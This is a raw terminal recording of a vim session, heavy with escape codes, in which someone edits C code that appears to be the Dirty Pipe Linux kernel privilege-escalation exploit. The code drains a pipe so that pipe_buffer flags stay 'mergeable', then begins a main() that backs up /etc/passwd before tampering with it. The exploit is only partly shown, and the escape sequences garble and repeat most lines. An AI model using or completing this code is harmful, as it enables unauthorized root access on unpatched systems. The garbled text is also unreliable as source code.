r;[24;63H[K[24;63H32,2-9[8C13%[16;9H[24;66H3-17[16;17H[24;66H4-25[16;25H[24;66H5-33[16;33H[24;66H6-41[16;41H[24;66H7-49[16;49H[24;66H8-50[16;50H[24;66H9-51[16;51H[24;66H10-52[16;52H[24;67H1-53[16;53H[24;67H2-54[16;54H[24;67H3-55[16;55H[24;67H4-56[16;56H[24;67H5-57[16;57H[24;67H4-56[16;56H[24;67H3-55[16;55H[24;67H2-54[16;54H[24;67H1-53[16;53H[24;67H0-52[16;52H[24;66H9-51 [16;51H[24;66H8-50[16;50H[24;66H7-49[16;49H[16;41H/* drain the pipe, freeing all pipe_bufff[17;1Her instances (but[17;18H[K[24;66H6-41[16;41H[16;33H/* drain the pipe, freeing all pipe_buffer instaa[17;1Hnces (but[17;10H[K[24;66H5-33[16;33H[16;25H/* drain the pipe, freeing all pipe_buffer instances (buu[17;1Ht[17;2H[K[24;66H4-25[16;25H[16;23r[23;1H
[1;24r[16;1H [15C/* drain the pipe, freeing all pipe_buffer instances (but[23;1H[1m@@@[0m[24;63H[K[24;63H32,3-17[7C13%[16;17H[16;9H/* drain the pipe, freeing all pipe_buffer instances (but[16;66H[K[24;66H2-9 [16;9H/* drain the pipe, freeing all pipe_buffer instances (but[16;58H[K[24;66H1  [16;1H        /* drain the pipe, freeing all pipe_buffer instances (but[24;66H2-9[16;9H[24;64H3[17;9H[24;66H3-17[17;17H[24;66H4-25[17;25H[24;66H5-33[17;33H[24;66H6-41[17;41H[24;66H7-49[17;49H[24;66H8-50[17;50H[24;66H9-51[17;51H[24;66H10-52[17;52H[24;67H1-57[17;57H[24;67H2-58[17;58H[24;67H3-59[17;59H[24;67H4-60[17;60H[24;67H5-61[17;61H[24;67H6-62[17;62H[24;67H7-63[17;63H[24;67H6-62[17;62H[24;67H5-61[17;61H[24;67H4-60[17;60Hleaving the flags initt[18;1Hialized) */[18;12H[K[24;67H3-59[17;59Hleaving the flags initii[18;1Halized) */[18;11H[K[24;67H2-58[17;58Hleaving the flags initiaa[18;1Hlized) */[18;10H[K[24;67H1-57[17;57Hleaving the flags initializedd[18;1H) */[18;5H[K[24;67H0-52[17;52Hleaving the flags initialized))[18;1H */[18;4H[K[24;66H9-51 [17;51Hleaving the flags initialized)  [18;1H*/[18;3H[K[24;66H8-50[17;50Hleaving the flags initialized) **[18;1H/[18;2H[K[24;66H7-49[17;49H[17;23r[23;1H
[1;24r[17;1H [39Cleaving the flags initialized) */[22;1H   [76C  [23;1H [7Cread(p[0], buffer, n);[24;63H[K[24;63H33,6-41[7C13%[17;41H[17;33Hleaving the flags initialized) */[17;66H[K[24;66H5-33[17;33H[17;25Hleaving the flags initialized) */[17;58H[K[24;66H4-25[17;25H[17;17Hleaving the flags initialized) */[17;50H[K[24;66H3-17[17;17H[17;9Hleaving the flags initialized) */[17;42H[K[24;66H2-9 [17;9Hleaving the flags initialized) */[17;34H[K[24;66H1  [17;1H[16;66Hleaving the flaa[17;1Hgs initialized) */[17;19H[K[24;64H2,59-66[16;66H leaving the fll[17;1Hags initialized) */[24;66H60-67[16;67H[16;67H[K[17;1H         * leaving the flags initialized) */[24;64H3,5-12 [17;12H[1;23r[1;1H[2M[1;24r[23;25Hr -= n;[24;63H[K[24;63H34,2-9[8C14%[16;9H[24;66H3-17[16;17H[24;66H4-25[16;25H[24;66H5-33[16;33H[24;66H6-41[16;41H[24;66H7-49[16;49H[24;66H8-50[16;50H[24;66H9-51[16;51H[24;66H10-52[16;52H[24;67H1-53[16;53H[24;67H2-54[16;54H[24;67H1-53[16;53H[24;67H0-52[16;52H[24;66H9-51 [16;51H[24;66H8-50[16;50H[24;66H7-49[16;49H[16;23r[23;1H
[1;24r[16;2H     [34Cfor (unsigned r = pipe_size; r > 0;) {[23;1H[1m@@@[0m[24;63H[K[24;63H34,6-41[7C14%[16;41H[16;33Hfor (unsigned r = pipe_size; r > 0;) {[16;72H[K[24;66H5-33[16;33H[16;25Hfor (unsigned r = pipe_size; r > 0;) {[16;64H[K[24;66H4-25[16;25H[16;17Hfor (unsigned r = pipe_size; r > 0;) {[16;56H[K[24;66H3-17[16;17H[16;9Hfor (unsigned r = pipe_size; r > 0;) {[16;48H[K[24;66H2-9 [16;9Hfor (unsigned r = pipe_size; r > 0;) {[16;40H[K[24;66H1  [16;1H        for (unsigned r = pipe_size; r > 0;) {[24;66H2-9[16;9H[24;64H5[17;9H[24;66H3-17[17;17H[24;66H4-25[17;25H[24;66H5-33[17;33H[24;66H6-41[17;41H[24;66H7-49[17;49H[24;66H8-57[17;57H[24;66H9-65[17;65H[24;66H10-73[17;73H[24;67H1-74[17;74H[24;67H2-75[17;75H[24;67H3-76[17;76H[24;67H4-77[17;77H[24;67H5-78[17;78H[24;67H6-79[17;79H[24;67H7-80[17;80H[24;67H8-81[18;1H[24;67H7-80[17;80H[24;67H6-79[17;79H[24;67H5-78[17;78H[24;67H4-77[17;77H[24;67H3-76[17;76H[24;67H2-75[17;75H[24;67H1-74[17;74H[24;67H0-73[17;73H[17;65Hunsigned n = r >>[18;1H sizeof(buffer) ? sizeof(buffer) : r;[18;38H[K[24;66H9-65 [17;65H[17;57Hunsigned n = r > sizeof(([18;1Hbuffer) ? sizeof(buffer) : r;[18;30H[K[24;66H8-57[17;57H[17;49Hunsigned n = r > sizeof(buffer)  [18;1H? sizeof(buffer) : r;[18;22H[K[24;66H7-49[17;49H[17;41Hunsigned n = r > sizeof(buffer) ? sizeoff[18;1H(buffer) : r;[18;14H[K[24;66H6-41[17;41H[17;33Hunsigned n = r > sizeof(buffer) ? sizeof(buffer))[18;1H : r;[18;6H[K[24;66H5-33[17;33H[17;23r[23;1H
[1;24r[17;2H    [19Cunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;[22;1H   [76C  [23;1H [31C}[24;63H[K[24;63H35,4-25[7C15%[17;25H[17;17Hunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;[17;70H[K[24;66H3-17[17;17H[17;9Hunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;[17;62H[K[24;66H2-9 [17;9H        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;[24;66H3-17[17;17H[1;23r[23;1H
[1;24r[24;63H[K[24;63H36,3-17[7C15%[17;17H[1;23r[1;1H[2M[1;24r[22;57H/* the pipe is now emptyy[23;1H, and if somebody adds a new[24;63H[K[24;63H37,3-17[7C17%[17;17H[24;66H2-9 [17;9H[24;64H6[15;9H[24;66H3-17[15;17H[24;66H4-25[15;25H[24;66H5-33[15;33H[24;66H6-41[15;41H[24;66H7-49[15;49H[24;66H8-57[15;57H[24;66H9-65[15;65H[24;66H10-73[15;73H[24;67H1-81[16;1H[24;67H2-89[16;9H[24;67H3-90[16;10H[24;67H4-91[16;11H[24;67H5-92[16;12H[24;67H6-93[16;13H[24;67H7-94[16;14H[24;67H8-95[16;15H[24;67H9-96[16;16H[24;66H20-97[16;17H[24;67H1-98[16;18H[24;67H2-99[16;19H[24;67H1-98[16;18H[24;67H0-97[16;17H[24;66H19-96[16;16H[24;67H8-95[16;15H[24;67H7-94[16;14H[24;67H6-93[16;13H[24;67H5-92[16;12H[24;67H4-91[16;11H[[24;53H^[[16;11H[24;55H[[16;11H[24;53H   [16;11Ha[24;67H3-90[16;10H[24;67H2-89[16;9Hread(p[0], buffer, n);[16;23H[K[24;67H1-81[16;1H[15;73Hread(p[00[16;1H], buffer, n);[16;15H[K[24;67H0-73[15;73H[15;65Hread(p[0], buffee[16;1Hr, n);[16;7H[K[24;66H9-65 [15;65H[15;23r[23;1H
[1;24r[15;1H      [50Cread(p[0], buffer, n);[23;58H*[9Cpipe_buffer w[23;1H[1m@@[0m[23;58H[K[23;3H[1m@[0m[24;63H[K[24;63H36,8-57[7C17%[15;57H[15;49Hread(p[0], buffer, n);[15;71H[K[24;66H7-49[15;49H[15;41Hread(p[0], buffer, n);[15;63H[K[24;66H6-41[15;41H[15;33Hread(p[0], buffer, n);[15;55H[K[24;66H5-33[15;33H[15;25Hread(p[0], buffer, n);[15;47H[K[24;66H4-25[15;25H[15;17Hread(p[0], buffer, n);[15;39H[K[24;66H3-17[15;17H[24;64H7[16;17H[63C  [17;1H [15Cr -= n;[17;25H[K[24;66H2-9 [16;9H[71C  [17;1H [7Cr -= n;[17;17H[K[24;66H1  [16;1H[15;23r[23;1H
[1;24r[15;17Hread(p[0], buffer, n);[41C  [16;1H [7C       [25Cr -= n;[22;1H   [54C*[9Cpipe_buffer ww[23;1Hithout initializing its "flags", the buffer[24;63H[K[24;63H36,25-39      17%[15;39H[24;67H6-41[15;41H[24;67H7-49[15;49H[24;67H8-57[15;57H[24;67H9-65[15;65H[24;66H30-73[15;73H[24;67H1-81[16;1H[24;67H2-89[16;9H[24;67H3-97[16;17H[24;67H4-105[16;25H[24;67H5-113[16;33H[24;67H6-121[16;41H[24;67H7-122[16;42H[24;67H6-121[16;41H[16;33Hr -= n;[16;41H[K[24;67H5-113[16;33H[16;25Hr -= n;[16;33H[K[24;67H4-105[16;25H[16;17Hr -= n;[16;25H[K[24;67H3-97 [16;17H[24;64H7,1[18;17H[24;67H4-105[18;25H[24;67H5-113[18;33H[24;67H6-114[18;34H[24;67H5-113[18;33H[18;25H}[18;33H[K[24;67H4-105[18;25H[18;17H}[18;25H[K[24;67H3-97 [18;17H[18;9H}[18;17H[K[24;67H2-89[18;9H}[18;9H[K[24;67H1-81[18;1H[17;23r[23;1H
[1;24r[17;1H [71C}[23;58H*[17Cwill[1m@@[0m[23;58H[K[23;3H[1m@[0m[24;63H[K[24;63H37,10-73      17%[17;73H[17;65H}[17;73H[K[24;66H9-65 [17;65H[17;57H}[17;65H[K[24;66H8-57[17;57H[17;49H}[17;57H[K[24;66H7-49[17;49H[17;41H}[17;49H[K[24;66H6-41[17;41H[17;33H}[17;41H[K[24;66H5-33[17;33H[17;25H}[17;33H[K[24;66H4-25[17;25H[17;17H}[17;25H[K[24;66H3-17[17;17H[17;9H}[17;17H[K[24;66H2-9 [17;9H[24;64H8,1  [18;1H[1;23r[1;1H[2M[1;24r[21;1H   [54C*[17Cwill  [22;1Hbe mergeable */
}[24;63H[K[24;63H39,3-17[7C18%[17;17H[24;66H4-25[17;25H[24;66H5-33[17;33H[24;66H6-41[17;41H[24;66H7-49[17;49H[24;66H8-57[17;57H[24;66H9-58[17;58H[24;66H10-59[17;59H[24;67H1-60[17;60H[24;67H2-61[17;61H[24;67H3-62[17;62H[24;67H4-63[17;63H[24;67H5-64[17;64H[24;67H6-65[17;65H[24;67H7-66[17;66H[24;67H6-65[17;65H[24;67H5-64[17;64H[24;67H4-63[17;63H[24;67H3-62[17;62H[24;67H2-61[17;61H[24;67H1-60[17;60H[24;67H0-59[17;59H[24;66H9-58 [17;58H[24;66H8-57[17;57H[17;49H/* the pipe is now empty, and iff[18;1H somebody adds a new[18;21H[K[24;66H7-49[17;49H[17;41H/* the pipe is now empty, and if somebodd[18;1Hy adds a new[18;13H[K[24;66H6-41[17;41H[17;33H/* the pipe is now empty, and if somebody adds aa[18;1H new[18;5H[K[24;66H5-33[17;33H[17;23r[23;1H
[1;24r[17;2H   [20C/* the pipe is now empty, and if somebody adds a new[24;63H[K[24;63H39,4-25[7C18%[17;25H[17;17H/* the pipe is now empty, and if somebody adds a new[17;69H[K[24;66H3-17[17;17H[17;9H/* the pipe is now empty, and if somebody adds a new[17;61H[K[24;66H2-9 [17;9H/* the pipe is now empty, and if somebody adds a new[17;53H[K[24;66H1  [17;1H        /* the pipe is now empty, and if somebody adds a new[24;66H2-9[17;9H[1;23r[1;1H[2M[1;24r[22;1Hint main() {[23;17Hconst char *const path = "/etc/passwd";[24;63H[K[24;63H40,2-9[8C19%[16;9H[24;66H3-17[16;17H[24;66H4-25[16;25H[24;66H5-33[16;33H[24;66H6-41[16;41H[24;66H7-49[16;49H[24;66H8-57[16;57H[24;66H9-58[16;58H[24;66H10-59[16;59H[24;67H1-60[16;60H[24;67H2-65[16;65H[24;67H3-66[16;66H[24;67H4-67[16;67H[24;67H3-66[16;66H[24;67H4-67[16;67H[24;67H5-68[16;68Hpipe_buffer wii[17;1Hthout initializing its "flags", the buffer[17;43H[K[24;67H4-67[16;67Hpipe_buffer witt[17;1Hhout initializing its "flags", the buffer[17;42H[K[24;67H3-66[16;66Hpipe_buffer withh[17;1Hout initializing its "flags", the buffer[17;41H[K[24;67H2-65[16;65Hpipe_buffer without ii[17;1Hnitializing its "flags", the buffer[17;36H[K[24;67H1-60[16;60Hpipe_buffer without inn[17;1Hitializing its "flags", the buffer[17;35H[K[24;67H0-59[16;59H[24;66H9-58 [16;58H*pipe_buffer without inii[17;1Htializing its "flags", the buffer[17;34H[K[24;66H8-57[16;57H[16;49H*pipe_buffer without initializinn[17;1Hg its "flags", the buffer[17;26H[K[24;66H7-49[16;49H[16;41H*pipe_buffer without initializing its "ff[17;1Hlags", the buffer[17;18H[K[24;66H6-41[16;41H[16;33H*pipe_buffer without initializing its "flags", tt[17;1Hhe buffer[17;10H[K[24;66H5-33[16;33H[16;25H*pipe_buffer without initializing its "flags", the buffee[17;1Hr[17;2H[K[24;66H4-25[16;25H[16;23r[23;1H
[1;24r[16;1H [15C*pipe_buffer without initializing its "flags", the buffer[24;63H[K[24;63H40,3-17[7C20%[16;17H[16;9H*pipe_buffer without initializing its "flags", the buffer[16;66H[K[24;66H2-9 [16;9H        *pipe_buffer without initializing its "flags", the buffer[24;66H3-17[16;17H[16;9H*pipe_buffer without initializing its "flags", the buffer[16;66H[K[24;66H2-9 [16;9H*pipe_buffer without initializing its "flags", the buffer[16;58H[K[24;66H1  [16;1H[15;61H*pipe_buffer withoutt[16;1H initializing its "flags", the buffer[16;39H[K[24;63H39,54-61[15;61H[24;67H5-62[15;62Hpipe_buffer without  [16;1Hinitializing its "flags", the buffer[16;37H[K[24;67H4-61[15;61H[15;61H[K[16;1H         * pipe_buffer without initializing its "flags", the buffer[24;63H40,5-12 [16;12H[24;64H1,2-9 [17;9H[1;23r[1;1H[2M[1;24r[22;25Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n""[23;1H);[24;63H[K[24;63H42,2[10C21%[17;2H[24;64H1,2-9[15;9H[24;66H3-17[15;17H[24;66H4-25[15;25H[24;66H5-33[15;33H[24;66H6-41[15;41H[24;66H7-49[15;49H[24;66H8-57[15;57H[24;66H9-58[15;58H[24;66H10-59[15;59H[24;67H1-60[15;60H[24;67H2-65[15;65H[24;67H3-66[15;66H[24;67H4-67[15;67H[24;67H5-68[15;68H[24;67H6-73[15;73H[24;67H7-74[15;74H[24;67H8-75[15;75H[24;67H9-76[15;76Hwill bb[16;1He mergeable */[16;15H[K[24;67H8-75[15;75Hwill bee[16;1H mergeable */[16;14H[K[24;67H7-74[15;74Hwill be  [16;1Hmergeable */[16;13H[K[24;67H6-73[15;73Hwill be mergee[16;1Hable */[16;8H[K[24;67H5-68[15;68Hwill be mergeaa[16;1Hble */[16;7H[K[24;67H4-67[15;67Hwill be mergeabb[16;1Hle */[16;6H[K[24;67H3-66[15;66Hwill be mergeabll[16;1He */[16;5H[K[24;67H2-65[15;65H[15;23r[23;1H
[1;24r[15;1H    [53C* will be mergeable */[23;33HFILE *f1 = fopen("/etc/passwd", "r");[24;63H[K[24;63H41,11-60      21%[15;60Hwill be mergeable */[15;79H[K[24;67H0-59[15;59Hwill be mergeable */[15;78H[K[24;66H9-58 [15;58Hwill be mergeable */[15;77H[K[24;66H8-57[15;57H[15;49Hwill be mergeable */[15;69H[K[24;66H7-49[15;49H[15;41Hwill be mergeable */[15;61H[K[24;66H6-41[15;41H[15;33Hwill be mergeable */[15;53H[K[24;66H5-33[15;33H[15;25Hwill be mergeable */[15;45H[K[24;66H4-25[15;25H[15;17Hwill be mergeable */[15;37H[K[24;66H3-17[15;17H[15;9Hwill be mergeable */[15;29H[K[24;66H2-9 [15;9Hwill be mergeable */[15;21H[K[24;66H1  [15;1H[14;68Hwill be mergee[15;1Hable */[15;9H[K[24;64H0,61-68[14;68H[14;68H[K[15;1H         * will be mergeable */[24;64H1,5-12 [15;12H[24;64H2,2   [16;2H[24;64H3,1[17;1H[24;64H2,2[16;2H[24;64H3,1[17;1H[24;64H4,12[18;12H[24;67H3[18;13H[1;23r[1;1H[2M[1;24r[22;41HFILE *f2 = fopen("/tmp/passwd.bak", "w"))[23;1H;[24;63H[K[24;63H45,2-9[8C22%[17;9H[24;66H3-17[17;17H[17;9Hconst char *const path = "/etc/passwd";[17;48H[K[24;66H2-9 [17;9Hconst char *const path = "/etc/passwd";[17;40H[K[24;66H1  [17;1H        const char *const path = "/etc/passwd";[24;66H2-9[17;9H[24;64H6,1  [18;1H[1;23r[1;1H[2M[1;24r[23;49Hif (f1 == NULL) {[24;63H[K[24;63H47,2-9[8C23%[17;9H[24;66H3-17[17;17H[24;66H4-18[17;18H[24;66H5-19[17;19H[24;66H6-20[17;20H[24;66H7-21[17;21H[24;66H8-22[17;22H[24;66H9-23[17;23H[24;66H10-24[17;24H[24;67H1-25[17;25Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n"))[18;1H;[18;2H[K[24;67H0-24[17;24H[17;23r[23;1H
[1;24r[17;1H [21Cprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[23;69Hprintf("Fail[23;1H[1m@@[0m[23;69H[K[23;3H[1m@[0m[24;63H[K[24;63H47,9-23[7C23%[17;23Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[17;80H[K[24;66H8-22[17;22Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[17;79H[K[24;66H7-21[17;21Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[17;78H[K[24;66H6-20[17;20Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[17;77H[K[24;66H5-19[17;19Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[17;76H[K[24;66H4-18[17;18Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[17;75H[K[24;66H3-17[17;17H[17;9Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[17;67H[K[24;66H2-9 [17;9Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[17;59H[K[24;66H1  [17;1H[16;23r[23;1H
[1;24r[22;1H   [65Cprintf("Faill[23;1Hed to open /etc/passwd\n");[24;63H[K[24;63H46,1[10C24%[16;1H[15;48Hprintf("Backing up /etc/passwd too[16;1H /tmp/passwd.bak ...\n");[16;26H[K[24;64H5,41-48[15;48Hprintf("Backing up /etc/passwd to  [16;1H/tmp/passwd.bak ...\n");[16;25H[K[24;67H0-47[15;47H;printf("Backing up /etc/passwd too[16;1H /tmp/passwd.bak ...\n");[24;67H1-48[15;48H[15;48H[K[16;2H       printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[24;64H6,2-9  [16;9H[17;23r[17;1H[L[1;24r[16;9H[K[17;9Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");[23;1H[1m@@[0m[23;69H[K[23;3H[1m@[0m[24;63H[K[24;63H47,2-9[8C23%[17;9H[24;64H8[18;9H[24;66H3-17[18;17H[24;66H4-25[18;25H[24;66H5-26[18;26H[24;66H6-27[18;27H[24;66H7-28[18;28H[24;66H8-29[18;29H[24;66H9-30[18;30H[24;66H10-31[18;31H[24;67H1-32[18;32H[24;67H2-33[18;33HFILE *f1 = fopen("/etc/passwd", "r");[18;69H[K[24;67H1-32[18;32HFILE *f1 = fopen("/etc/passwd", "r");[18;68H[K[24;67H0-31[18;31HFILE *f1 = fopen("/etc/passwd", "r");[18;67H[K[24;66H9-30 [18;30HFILE *f1 = fopen("/etc/passwd", "r");[18;66H[K[24;66H8-29[18;29HFILE *f1 = fopen("/etc/passwd", "r");[18;65H[K[24;66H7-28[18;28HFILE *f1 = fopen("/etc/passwd", "r");[18;64H[K[24;66H6-27[18;27HFILE *f1 = fopen("/etc/passwd", "r");[18;63H[K[24;66H5-26[18;26HFILE *f1 = fopen("/etc/passwd", "r");[18;62H[K[24;66H4-25[18;25H[18;17HFILE *f1 = fopen("/etc/passwd", "r");[18;54H[K[24;66H3-17[18;17H[18;9HFILE *f1 = fopen("/etc/passwd", "r");[18;46H[K[24;66H2-9 [18;9H[1;23r[1;1H[3M[1;24r[20;1H   [65Cprintf("Faill[21;1Hed to open /etc/passwd\n");

exit(EXIT_FAILURE);[24;63H[K[24;63H49,2-9[8C25%[16;9H[24;66H3-17[16;17H[24;66H4-25[16;25H[24;66H5-33[16;33H[24;66H6-34[16;34H[24;66H7-35[16;35H[24;66H8-36[16;36H[24;66H9-37[16;37H[24;66H10-38[16;38H[24;67H1-39[16;39H[24;67H2-40[16;40H[24;67H3-41[16;41H[16;23r[23;1H
